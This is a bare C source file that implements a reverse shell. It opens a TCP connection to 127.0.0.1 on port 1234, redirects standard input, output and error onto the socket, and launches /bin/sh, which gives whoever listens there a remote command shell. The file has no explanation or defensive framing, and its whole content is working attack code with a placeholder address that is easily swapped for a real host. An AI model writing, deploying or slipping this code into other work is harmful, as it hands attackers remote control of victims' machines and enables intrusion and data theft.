#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#include <stdlib.h>
#include <err.h>

#define SERVERADDR "127.0.0.1"
#define SERVERPORT 1234

int main() 
{
    int socket_fd;
    struct sockaddr_in sa_in;

    if ((socket_fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
        err(EXIT_FAILURE, "socket");

    // Set family
    sa_in.sin_family = AF_INET;

    // Set address
    if (inet_pton(AF_INET, SERVERADDR, &sa_in.sin_addr.s_addr) == -1)
        err(EXIT_FAILURE, "inet_pton");

    // Set port
    sa_in.sin_port = htons(SERVERPORT);

    if (connect(socket_fd, &sa_in, sizeof(sa_in)) == -1)
        err(EXIT_FAILURE, "connect");

    // Dup file describer
    if (dup2(socket_fd, STDIN_FILENO) == -1)
        err(EXIT_FAILURE, "dup2 STDIN_FILENO");

    if (dup2(socket_fd, STDERR_FILENO) == -1)
        err(EXIT_FAILURE, "dup2 STDERR_FILENO");

    if (dup2(socket_fd, STDOUT_FILENO) == -1)
        err(EXIT_FAILURE, "dup2 STDOUT_FILENO");

    if (execl("/bin/sh", "sh", NULL) == -1)
        err(EXIT_FAILURE, "execl");

    close(socket_fd);
}
